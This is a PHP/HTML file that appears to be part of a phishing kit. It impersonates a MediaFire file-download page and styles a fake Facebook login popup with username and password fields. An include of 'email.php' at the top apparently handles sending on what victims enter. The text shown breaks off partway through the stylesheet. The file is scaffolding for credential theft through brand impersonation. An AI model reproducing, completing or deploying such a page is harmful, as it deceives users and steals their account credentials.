<?php
include('email.php');
//codee



?>

<html lang="en-US" style="height: 100%;"><head>
<meta charset="utf-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title><?php echo $namafile; ?></title>
<link rel="shortcut icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAv0lEQVR4AWMYvECn7bYPEC8G4ktA/BKIb0H5wUDMhE+jM1TTfzz4GBCLomvUBOIVyAoJGYLNdiYgtgDiaegarPruYTPEB6ZRFpemrj2v/7/8/Ps/EIDp6IWPkdVMg/kZLmjQcQesaM2Fj/+//Pz7Hx0cvvMV2YB9DLj86Db1PtgQdLDv1hcMA/ih3hAF+QndoKJ1z/F7AU1zE0ySyEB0Rg79YEhioTwag8lJSNgM0wXiZqjiW1BDF0O9yjR4Mh0AQg2NLYeiiKsAAAAASUVORK5CYII=">
<meta name="keywords" content="online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, photo backup, photo sharing, ftp replacement, cross platform, remote access, mobile access, send large files, recover files, file versioning, undelete, Windows, PC, Mac, OS X, Linux, iPhone, iPad, Android">
<meta name="description" content="MediaFire is a simple to use free service that lets you put all your photos, documents, music, and video in a single place so you can access them anywhere and share them everywhere.">
<meta name="robots" content="noindex,nofollow">
<meta name="googlebot" content="noindex,nofollow">
<meta name="slurp" content="noindex,nofollow">
<meta name="google-translate-customization" content="5587c1b0a958bf07-62a8e309de686e87-gc92f61279a2c8524-11">
<meta property="fb:app_id" content="124578887583575">
<meta property="og:type" content="website">
<meta property="og:site_name" content="MediaFire">
<meta property="og:locale" content="en_US">
<meta property="og:url" content="<?php echo $linkweb ?>">
<meta property="og:title" content="<?php echo $namafile; ?>">
<meta property="og:image" content="https://static.mediafire.com/images/filetype/download/video.jpg">
<meta property="og:description" content="MediaFire is a simple to use free service that lets you put all your photos, documents, music, and video in a single place so you can access them anywhere and share them everywhere.">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@MediaFire">
<meta name="twitter:url" content="<?php echo $linkweb ?>">
<meta name="twitter:title" content="<?php echo $namafile; ?>">
<meta name="twitter:image" content="https://static.mediafire.com/images/filetype/download/video.jpg">
<meta name="twitter:description" content="MediaFire is a simple to use free service that lets you put all your photos, documents, music, and video in a single place so you can access them anywhere and share them everywhere.">
<link href="https://plus.google.com/+mediafire" rel="publisher">
<meta itemprop="name" content="<?php echo $namafile; ?>">
<meta itemprop="image" content="https://static.mediafire.com/images/filetype/download/video.jpg">
<meta itemprop="description" content="">
<style>
    .navbar-fb {
    background: #3b5998;
    height: auto;
    width:auto;
    padding: 8px;
    border-top-left-radius: 10px;
    border-top-right-radius: 10px;
}
.navbar-fb img {
    width: 115PX;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.content-box-fb {
    width: 300px;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.content-box-fb .alert {
    display: none;
    left: -15px;
    position: relative;
    width: 320px;
    padding: 5px;
    background: red;
    color:#fff;
    font-size: 13px;
    font-family: 'Roboto';
}
.content-box-fb img {
    width: 60px;
    margin-top: 20px;
    margin-left: auto;
    margin-right: auto;
    border-radius: 12px;
    display: block;
}
.txt-login-fb {
    width: 290px;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 17px;
    padding: 8px;
    color: #90949c;
    font-size: 16px;
    font-family: Roboto;
    text-align: center;
    display: block;
}
.login-facebook-form input[type="text"],.login-facebook-form input[type="password"] {
    width: 100%;
    height: auto;
    padding: 12px;
    color: #000;
    font-size: 14px;
    font-weight: 400;
    font-family: 'Lato',sans-serif;
    border: 1px solid #bdbebf;
    cursor: pointer;
    outline: none;
}
.login-facebook-form input[type="text"] {
    margin: 0px;
    padding-bottom: 13px;
    border-bottom: none;
    border-radius: 4px 4px 0 0;
    box-shadow: 0 -1px 0 #E0E0E0 inset,0 0px 0px rgba(0,0,0,0.23) inset;
}
.login-facebook-form input[type="password"] {
    margin: 0px;
    border-top: none;
    border-radius: 0 0 4px 4px;
    box-shadow: 0 -0px 0 rgba(0,0,0,0.23) inset,0 0px 0px rgba(255,255,255,0.1);
}
.btn-login-fb {
    background: #1778f2;
    width: 100%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    padding: 10px;
    color: #fff;
    font-size: 14px;
    font-family: Roboto;
    font-weight: bold;
    text-align: center;
    text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
    border: 1px solid #3578e5;
    border-radius: 5px;
    box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
    outline: none;
    display: block;
}
.btn-login-fb.disabled
{
    pointer-events: none;
    background:#8b9dc3;
    border:1px solid #8b9dc3;
}
.txt-create-account {
    margin-top: 4px;
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.txt-not-now {
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.txt-forgotten-password {
    width: 100%;
    height: auto;
    margin-bottom: 30px;
    padding: 5px;
    color: #7596c8;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.language-box {
    width: 100%;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.language-name {
    width: 40%;
    height: auto;
    margin: 5px;
    margin-bottom: 0px;
    color: #3b5998;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: inline-block;
}
.language-name i {
    width: 23px;
    padding: 4px;
    color: #90949c;
    border: 1px solid #3b5998;
    border-radius: 3px;
}
.language-name-active {
    color: #90949c;
    font-weight: bold;
}
.copyright {
    width: 40%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    color: #90949c;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: block;
}
.popup-login {
    background:rgba(0,0,0,0.5);
    width:100%;
    height:100%;
    position:fixed;
    top:0;
    left:0;
    z-index: 999999999999999999;
    display: none;
}
.popup-box-login-fb {
    background:#ECEFF6;
    max-width:330px;
    height:auto;
    position:relative;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    text-align:center;
    font-family:'Teko';
    color:#000;
    border-radius:10px;
}
</style>
<style type="text/css">
    :root{--mf-blue1:#000A27;--mf-blue2:#002369;--mf-blue3:#0045AD;--mf-blue4:#0070F0;--mf-blue5:#479DF4;--mf-blue6:#8FC7F8;--mf-blue7:#D6ECFD;--mf-gray1:#1E232F;--mf-gray2:#222835;--mf-gray3:#3D424E;--mf-gray4:#575B65;--mf-gray5:#72767E;--mf-gray6:#8C8F96;--mf-gray7:#A7A9AE;--mf-gray8:#C1C3C7;--mf-gray9:#DBDCDF;--mf-gray10:#E9EAEB;--mf-gray11:#F4F4F5;--mf-green1:#082118;--mf-green2:#165A3A;--mf-green3:#259355;--mf-green4:#33CC66;--mf-green5:#6CDA8E;--mf-green6:#A5E9B7;--mf-green7:#DEF7E4;--mf-gold1:#291F01;--mf-gold2:#705403;--mf-gold3:#B88A05;--mf-gold4:#FFBF07;--mf-gold5:#FFD14C;--mf-gold6:#FFE392;--mf-gold7:#FFF5D7;--mf-red1:#27100B;--mf-red2:#692B1D;--mf-red3:#AD4730;--mf-red4:#F06242;--mf-red5:#F48E77;--mf-red6:#F8BAAC;--mf-red7:#FDE6E1}button,hr,input{overflow:visible}audio,canvas,progress,video{display:inline-block}progress,sub,sup{vertical-align:baseline}[type=checkbox],[type=radio],legend{box-sizing:border-box;padding:0}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,main,menu,nav,section{display:block}h1{font-size:2em;margin:.67em 0}figure{margin:1em 40px}hr{box-sizing:content-box;height:0}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}dfn{font-style:italic}mark{background-color:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative}sub{bottom:-.25em}sup{top:-.5em}audio:not([controls]){display:none;height:0}img{border-style:none}svg:not(:root){overflow:hidden}button,input,optgroup,select,textarea{font-family:sans-serif;font-size:100%;line-height:1.15;margin:0}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:ButtonText dotted 1px}fieldset{padding:.35em .75em .625em}legend{color:inherit;display:table;max-width:100%;white-space:normal}textarea{overflow:auto}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}[hidden],template{display:none}html{font:normal normal normal 14px/1.6 'Open Sans',sans-serif}body{position:relative;top:0px;margin:0;padding:0;background:#f3f3f3;color:#222835;color:var(--mf-gray2);top:initial!important}body>.skiptranslate{display:none}.h1,.h2,.h3,.h4,.h5,.h6{font-weight:normal;line-height:1.4;margin-bottom:1rem}.h1{font-size:2.9rem}.h2{font-size:2.3rem}.h3{font-size:1.9rem}.h4{font-size:1.6rem}.h5{font-size:1.3rem}.h6{font-size:1rem;font-weight:bold}.font-weight-normal{font-weight:normal!important}.font-weight-bold{font-weight:bold!important}a{text-decoration:none;color:#0070F0;color:var(--mf-blue4)}a:hover{color:#002369;color:var(--mf-blue2)}ul,ol{list-style:none;padding:0}p,form{margin:0}textarea{line-height:1.6;border-width:1px;height:auto;padding:10px}body.modal-open{overflow:hidden}@supports (-webkit-overflow-scrolling:touch){body.modal-open{position:fixed}}.show-focus-outlines :not(.g-Select):focus,.lightTheme.show-focus-outlines .user-menu .g-Btn:focus,.darkTheme.show-focus-outlines .user-menu .g-Btn:focus{outline:0;box-shadow:inset 0 0 0 2px hsla(0,0%,100%,0.9),0 0 0 2px #002369;box-shadow:inset 0 0 0 2px hsla(0,0%,100%,0.9),0 0 0 2px var(--mf-blue2);border-radius:4px;z-index:1}.g-Btn{display:inline-block;vertical-align:middle;border-radius:3px;font-family:'Open Sans',sans-serif;font-size:11px;font-weight:normal;cursor:pointer;height:36px;line-height:36px;padding:0 15px;border:0;outline:0;text-transform:uppercase;text-align:center;-webkit-appearance:none;box-sizing:border-box}.g-Btn--primary{color:#fff;background:#0070F0;background:var(--mf-blue4)}.g-Btn--secondary{color:#575B65;color:var(--mf-gray4);background-color:#E9EAEB;background-color:var(--mf-gray10)}.g-Btn--tertiary{color:#fff;background:#6c3}.g-Btn--alt{color:#fff;background:#282f3d}.g-Btn:hover{background-image:-webkit-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-moz-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-ms-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-o-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05))}.g-Btn--alt:hover{background-image:-webkit-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-moz-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-ms-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-o-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08))}a.g-Btn--primary:hover,a.g-Btn--tertiary:hover,a.g-Btn--alt:hover{color:#fff}a.g-Btn--secondary:hover{color:#575B65;color:var(--mf-gray4)}.g-Icon{display:inline-block;vertical-align:middle;height:24px;width:24px;background-image:url(https://mediafire.com/images/icons/svg_dark/icons_sprite.svg);background-repeat:no-repeat}.g-Btn .g-Icon{margin:0 8px 0 -2px}.dropdown .g-Icon{margin-right:8px;opacity:0.5}.g-Icon--white{background-image:url(https://mediafire.com/images/icons/svg_light/icons_sprite.svg)}.g-Btn .g-Icon.g-Icon--right{margin:0 -2px 0 8px}.g-Icon--search{background-position:0 0}.g-Icon--add{background-position:-120px 0}.g-Icon--share{background-position:-192px 0}.g-Icon--settings{background-position:-720px 0}.g-Icon--upgrade{background-position:-792px 0}.g-Icon--help{background-position:-816px 0}.g-Icon--folder{background-position:-840px 0}.g-Icon--mobile{background-position:-888px 0}.g-Icon--link{background-position:-936px 0}.g-Icon--logout{background-position:-960px 0}.g-Icon--arrowRight{background-position:-1632px 0}.u-o5{opacity:0.5!important}.u-cf:after{visibility:hidden;display:block;font-size:0;content:" ";clear:both;height:0}.u-wrap{position:relative;max-width:960px;margin:0 auto}.g-Select{font-size:14px;height:30px;line-height:30px;border-radius:0;border:0 solid #E8E9EC;border-width:0 0 1px;background:#fff url(https://www.mediafire.com/images/icons/svg_dark/arrow_dropdown.svg) right center no-repeat;color:#282F3D;margin:0;padding:0 20px 0 0;box-sizing:border-box;-webkit-appearance:none;-moz-appearance:none;-webkit-border-radius:0px;transition:all .1s linear 0s}.g-Select:focus{outline:none;border-color:#0070F0;border-color:var(--mf-blue4);box-shadow:0 1px 0 0 #0070F0;box-shadow:0 1px 0 0 var(--mf-blue4)}.tooltip{display:none;position:absolute;font-size:11px;font-weight:400;line-height:16px;-moz-border-radius:5px;-webkit-border-radius:5px;border-radius:5px;padding:10px;-moz-box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);-webkit-box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);background:#fff;width:180px;text-align:center;text-transform:none;color:#000;z-index:20;white-space:normal}li:hover>.tooltip,div:hover>.tooltip,a:hover>.tooltip,span:hover>.tooltip{display:block}.tooltip.alt{color:#fff;background:#000}.tooltip.point-up:before,.tooltip.point-right:before,.tooltip.point-down:before,.tooltip.point-left:before{content:"";font-size:0px;line-height:0%;background:#fff;width:12px;height:12px;position:absolute;-moz-box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);-webkit-box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);-webkit-transform:rotate(45deg);-moz-transform:rotate(45deg);-ms-transform:rotate(45deg);-o-transform:rotate(45deg);transform:rotate(45deg)}.tooltip.point-up:after,.tooltip.point-right:after,.tooltip.point-down:after,.tooltip.point-left:after{content:"";background:#fff;width:20px;height:10px;position:absolute}.tooltip.point-left:after,.tooltip.point-right:after{width:10px;height:20px}.tooltip.alt:after{background:#000}.tooltip.alt:before{background:#000}.tooltip.point-up{top:100%;left:50%;margin:12px 0 0 -100px}.tooltip.point-left{left:100%;top:50%;margin:-20px 0 0 12px}.tooltip.point-down{bottom:100%;left:50%;margin:0 0 12px -100px}.tooltip.point-right{right:100%;top:50%;margin:-20px 12px 0 0}.tooltip.point-up:before{left:50%;top:-6px;margin:0 0 0 -6px}.tooltip.point-left:before{left:-6px;top:50%;margin:-6px 0 0 0}.tooltip.point-down:before{bottom:-6px;left:50%;margin:0 0 0 -6px}.tooltip.point-right:before{right:-6px;top:50%;margin:-6px 0 0 0}.tooltip.point-up:after{left:50%;top:0;margin:0 0 0 -10px}.tooltip.point-left:after{left:0;top:50%;margin:-10px 0 0 0}.tooltip.point-down:after{bottom:0;left:50%;margin:0 0 0 -10px}.tooltip.point-right:after{right:0;top:50%;margin:-10px 0 0 0}.tooltip.error-tip{padding-left:30px}.tooltip.error-tip:after{content:"";font-size:0px;line-height:0%;width:16px;height:16px;position:absolute;left:8px;top:8px;margin:0;background:url(https://mediafire.com/images/icons/warning-triangle.png) center no-repeat}.tooltipDismiss{position:absolute;background:#fff;height:18px;width:18px;border-radius:50%;right:8px;top:8px;color:#000;font-size:19px;line-height:18px;text-align:center;font-weight:bold;opacity:.6;cursor:pointer}.tooltipDismiss:after{content:"\00D7"}.tooltipDismiss:hover{opacity:.8}.d-hover:hover{background-image:-webkit-linear-gradient(top,rgba(0,0,0,.08),rgba(0,0,0,.08));background-image:-moz-linear-gradient(top,rgba(0,0,0,.08),rgba(0,0,0,.08));background-image:-ms-linear-gradient(top,rgba(0,0,0,.08),rgba(0,0,0,.08));background-image:-o-linear-gradient(top,rgba(0,0,0,.08),rgba(0,0,0,.08));background-image:linear-gradient(top,rgba(0,0,0,.08),rgba(0,0,0,.08))}#status{display:none;position:fixed;top:200px;left:50%;border-radius:5px;z-index:10000;color:white;text-align:center;width:400px;padding:30px;margin-left:-200px;background:rgba(0,0,0,0.75);cursor:pointer;box-sizing:border-box}@media (max-width:400px){#status{top:10px;left:10px;right:10px;margin:0;width:auto}}@media (max-height:500px){#status{top:10px}}#status-message{font-size:14px;font-weight:bold;line-height:1.3em;color:white;margin-bottom:10px}#status-close{font-size:10px;color:white}.labelSquare{-moz-border-radius:3px;-webkit-border-radius:3px;border-radius:3px;background:#555;color:#fff;vertical-align:text-bottom}.labelSquare.sm{-moz-border-radius:3px;-webkit-border-radius:3px;border-radius:3px;font-size:10px;padding:2px 4px}.lGood{background:#7EBB1B}.lNeutral{background:#aaa}.lWarning{background:#D85724}.dropdown{position:relative;-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px}.dropdown ul{visibility:hidden;opacity:0;max-width:0px;max-height:0px;box-shadow:none;-moz-box-shadow:none;-webkit-box-shadow:none;-webkit-transition:visibility 0s linear .1s,max-width 0s linear .1s,max-height 0s linear .1s,opacity .1s linear 0s;-moz-transition:visibility 0s linear .1s,max-width 0s linear .1s,max-height 0s linear .1s,opacity .1s linear 0s;-o-transition:visibility 0s linear .1s,max-width 0s linear .1s,max-height 0s linear .1s,opacity .1s linear 0s;transition:visibility 0s linear .1s,max-width 0s linear .1s,max-height 0s linear .1s,opacity .1s linear 0s;position:absolute;top:100%;left:0px;z-index:52;padding:8px 0px;white-space:nowrap;background:#fff;-moz-background-clip:padding;-webkit-background-clip:padding-box;background-clip:padding-box;border-radius:0px 3px 3px 3px;font-size:14px;text-align:left;font-family:'Open Sans',sans-serif}.dropdown.hoverShow:hover>ul,.dropdown.show_dropdown>ul{visibility:visible;opacity:1;max-height:999px;max-width:999px;-webkit-transition-delay:0s;-moz-transition-delay:0s;-o-transition-delay:0s;transition-delay:0s;-webkit-box-shadow:0px 0px 0px 1px rgba(0,0,0,.15),0px 3px 6px 0px rgba(0,0,0,.15);box-shadow:0px 0px 0px 1px rgba(0,0,0,.15),0px 3px 6px 0px rgba(0,0,0,.15)}.dropdown .centerBtn+ul{left:1px}.ddRight.dropdown>ul{left:auto;right:0px;border-radius:3px 0px 3px 3px;margin-right:10px;-webkit-transition:left 0s linear .1s,right 0s linear .1s,margin-right 0s linear .1}.ddRight.dropdown .centerBtn+ul,.ddRight.dropdown .leftBtn+ul{margin-right:0px}.dropdown li:hover,.dropdown .zeroclipboard-is-hover{background-color:rgba(0,0,0,.05)}.dropdown li a{color:#575B65;color:var(--mf-gray4);display:block;padding:4px 30px}.dropdown li:hover a{color:#282f3d}.dropdown li.divider{cursor:default!important;background:none!important;color:#666!important;font-size:10px;font-weight:bold;line-height:15px;text-transform:uppercase;padding:15px 0 10px 20px;border-top:1px solid #e2e2e2;margin:15px 0 0 0}li.firstDivider.divider{margin-top:0px;padding-top:0;border:none}.dropdown li.submenu{position:relative}.dropdown li.submenu>ul{left:100%;top:0;margin:-9px 0 0 -2px;-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px}.dropdown li.submenu:hover{background-color:#F2F2F3}.dropdown li.submenu:hover>ul{visibility:visible;opacity:1;max-height:999px;max-width:999px;-webkit-transition-delay:0s;-moz-transition-delay:0s;-o-transition-delay:0s;transition-delay:0s;-webkit-box-shadow:0px 0px 0px 1px rgba(0,0,0,.15),0px 3px 6px 0px rgba(0,0,0,.15);box-shadow:0px 0px 0px 1px rgba(0,0,0,.15),0px 3px 6px 0px rgba(0,0,0,.15)}.indicator-down,.indicator-up,.indicator-left,.indicator-right{position:absolute;height:12px;width:12px;right:0;top:50%;margin-top:-4px}li.ddSectionLabel{text-transform:uppercase;font-size:12px;color:#ABABAB;padding-top:5px;padding-bottom:0px;display:block;cursor:default}li.ddSectionLabel:hover{background:none;color:#ABABAB}.dropdown .checkbox{vertical-align:text-top;margin-left:0}li.ddStaticTxt{cursor:default;color:#575B65;color:var(--mf-gray4);font-style:italic;padding:4px 30px}li.ddStaticTxt:hover{background:transparent;color:#575B65;color:var(--mf-gray4)}.notificationBubble{height:16px;width:16px;line-height:16px;text-align:center;font-size:11px;color:white;border-radius:50%;background:#ef5939;display:inline-block;vertical-align:middle}.dropdown li .notificationBubble{margin-right:10px}#account .notificationBubble.top{position:absolute;top:-6px;left:40px;z-index:1}.labelRibbon{position:absolute;font-size:10px;text-transform:uppercase;font-weight:800;text-align:center;height:18px;width:64px;line-height:18px;top:19px;left:-5px;text-shadow:-1px 1px 0 rgba(0,0,0,.5);color:#fff;-webkit-transform:rotate(-45deg);-moz-transform:rotate(-45deg);-ms-transform:rotate(-45deg);-o-transform:rotate(-45deg);transform:rotate(-45deg);z-index:1;background-color:#262626;background-image:-webkit-linear-gradient(-90deg,rgba(255,255,255,.5),rgba(255,255,255,0));background-image:-moz-linear-gradient(-90deg,rgba(255,255,255,.5),rgba(255,255,255,0));background-image:-ms-linear-gradient(-90deg,rgba(255,255,255,.5),rgba(255,255,255,0));background-image:-o-linear-gradient(-90deg,rgba(255,255,255,.5),rgba(255,255,255,0));background-image:linear-gradient(-90deg,rgba(255,255,255,.5),rgba(255,255,255,0));border-radius:3px 3px 0 0}.labelRibbon:before,.labelRibbon:after{content:"";position:absolute;top:0;z-index:-1;border-color:transparent #262626 transparent transparent;border-style:solid;border-width:18px 18px 0px 18px;left:-35px}.labelRibbon:after{border-color:transparent transparent transparent #8e8e8e;left:auto;right:-35px}.windows.chrome .labelRibbon{-webkit-transform:translate3d(0,0,0) rotate(-45deg)}.labelRibbon.lrBlue{background-color:#1395EC}.labelRibbon.lrBlue:before{border-color:transparent #1395EC transparent transparent}.labelRibbon.lrBlue:after{border-color:transparent transparent transparent #85c8f5}.ie9 .labelRibbon:after{border-color:transparent transparent transparent #262626}.ie9 .labelRibbon.lrBlue:after{border-color:transparent transparent transparent #1395EC}.sandbox{display:block;position:fixed;z-index:50;box-shadow:0px 1px 2px 0px rgba(0,0,0,0.3);padding:0px 20px;margin:-5px -20px}.lightTheme .header,.darkTheme .header{background-color:#FFFFFF}.lightTheme .logo>a{background:url(https://mediafire.com/images/backgrounds/header/mf_logo_mono_reversed.svg) 0 center/180px auto no-repeat;opacity:.4}.lightTheme .user-menu .g-Btn{background-color:rgba(255,255,255,.15);box-shadow:inset 0 0 0 1px rgba(255,255,255,.08),0 0 0 1px rgba(0,0,0,.05);color:#fff}.lightTheme .user-menu .g-Btn:hover{background:rgba(255,255,255,.3)}.lightTheme .user-menu .g-Btn .g-Icon{background-image:url(https://mediafire.com/images/icons/svg_light/icons_sprite.svg);opacity:.7}.lightTheme .user-menu .g-Btn:hover .g-Icon{opacity:1}.lightTheme .user-menu .dropdown:not(.show_dropdown) #loggedin .smArrowDown{background-image:url(https://mediafire.com/images/icons/svg_light/icons_sprite.svg)}.darkTheme .logo>a{background:url(https://mediafire.com/images/backgrounds/header/mf_logo_mono.svg) 0 center/180px auto no-repeat;opacity:.4}.darkTheme .user-menu .g-Btn{background-color:rgba(255,255,255,.15);box-shadow:inset 0 0 0 1px rgba(255,255,255,.08),0 0 0 1px rgba(0,0,0,.05);color:rgba(0,0,0,.7)}.darkTheme .user-menu .g-Btn:hover{background:rgba(255,255,255,.3);color:#000}.darkTheme .user-menu .g-Btn .g-Icon{background-image:url(https://mediafire.com/images/icons/svg_dark/icons_sprite.svg);opacity:.7}.darkTheme .user-menu .g-Btn:hover .g-Icon{opacity:1}.customLogo .logo>a{background:url(//static.mediafire.com/images/backgrounds/header/mf_logo_full_color.svg) 0 center/contain no-repeat;opacity:1}.customLogo .logo{width:191px}.user-menu li.header-gt-cont{margin-right:10px}.gt-label{display:none;color:#828282;font-family:'Open Sans',sans-serif;font-size:12px}#goog-header-translate,#goog-footer-translate{display:inline-block;width:170px}#goog-header-translate{padding:0}#goog-footer-translate{margin-bottom:25px}#goog-header-translate>div,#goog-footer-translate>div{height:37px;font-size:0}#goog-header-translate>div span,#goog-footer-translate>div span{display:none}#goog-header-translate .goog-te-combo,#goog-footer-translate .goog-te-combo{font-size:13px;height:36px;line-height:36px;background:transparent url(https://www.mediafire.com/images/icons/svg_dark/arrow_dropdown.svg) right center no-repeat;border:0;border-radius:3px;margin:0;box-sizing:border-box;-webkit-appearance:none;-moz-appearance:none;width:100%;vertical-align:middle}#goog-header-translate .goog-te-combo::-ms-expand,#goog-footer-translate .goog-te-combo::-ms-expand{display:none}#goog-header-translate .goog-te-combo{padding:0 18px 0 50px}#goog-footer-translate .goog-te-combo{background-color:#fff;padding:0 20px 0 10px}#goog-header-translate .goog-te-combo:focus,#goog-footer-translate .goog-te-combo:focus{outline:none}.darkTheme #goog-header-translate .goog-te-combo{background-color:transparent;color:#000;border-color:rgba(0,0,0,.2)}.lightTheme #goog-header-translate .goog-te-combo{background-color:transparent;background-image:url(https://mediafire.com/images/icons/svg_light/arrow_dropdown.svg);color:#fff;border-color:rgba(255,255,255,.4)}@media (max-width:960px){#goog-footer-translate{margin-left:30px}}@media (max-width:770px){#goog-footer-translate{margin-top:25px;margin-bottom:0}}#goog-header-translate{background-size:24px;background-repeat:no-repeat;background-position:12px center}.en #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/usa.svg)}.af #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/zaf.svg)}.sq #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/alb.svg)}.am #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/eth.svg)}.ar #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/egy.svg)}.hy #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/arm.svg)}.az #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/aze.svg)}.eu #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/basque_country.svg)}.be #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/blr.svg)}.bn #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/bgd.svg)}.bs #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/bih.svg)}.bg #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/bgr.svg)}.ca #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/and.svg)}.ceb #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/phl.svg)}.ny #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/mwi.svg)}.zh-CN #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/chn.svg)}.zh-TW #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/hkg.svg)}.co #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/fra.svg)}.hr #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/hrv.svg)}.cs #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/cze.svg)}.da #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/dnk.svg)}.nl #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/nld.svg)}.eo #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/esperanto.svg)}.et #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/est.svg)}.tl #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/phl.svg)}.fi #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/fin.svg)}.fr #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/fra.svg)}.fy #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/nld.svg)}.gl #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/esp.svg)}.ka #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/geo.svg)}.de #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/deu.svg)}.el #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/grc.svg)}.gu #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/ind.svg)}.ht #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/hti.svg)}.ha #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/ner.svg)}.haw #goog-header-translate{background-image:url(https://www.mediafire.com/images/flags_svg/usa.svg)}.iw 